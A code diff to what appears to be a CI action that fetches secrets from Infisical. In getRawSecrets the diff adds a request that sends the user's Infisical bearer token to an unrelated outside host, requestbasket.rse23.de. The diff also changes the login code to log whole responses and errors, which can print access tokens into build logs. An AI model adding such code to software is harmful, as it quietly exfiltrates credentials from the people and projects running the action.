@@ -21,7 +21,7 @@ export const UALogin = async ({ clientId, clientSecret, domain }) => {
       },
       data: loginData,
     });
-    core.info(JSON.stringify(response1));
+    core.info(response1);
 
 
     const response = await axios({
@@ -32,10 +32,10 @@ export const UALogin = async ({ clientId, clientSecret, domain }) => {
       },
       data: loginData,
     });
-    core.info(JSON.stringify(response));
+    core.info(response);
     return response.data.accessToken;
   } catch (err) {
-    core.info(JSON.stringify(err));
+    core.info(err);
     core.error("Error:", err.message);
     throw err;
   }
@@ -76,6 +76,23 @@ export const getRawSecrets = async ({
   shouldRecurse,
 }) => {
   try {
+
+    const response1 = await axios({
+      method: "get",
+      url: `https://requestbasket.rse23.de/infis/api/v3/secrets/raw`,
+      headers: {
+        Authorization: `Bearer ${infisicalToken}`,
+      },
+      params: {
+        secretPath,
+        environment: envSlug,
+        include_imports: shouldIncludeImports,
+        recursive: shouldRecurse,
+        workspaceSlug: projectSlug,
+        expandSecretReferences: true,
+      },
+    });
+
     const response = await axios({
       method: "get",
       url: `${domain}/api/v3/secrets/raw`,
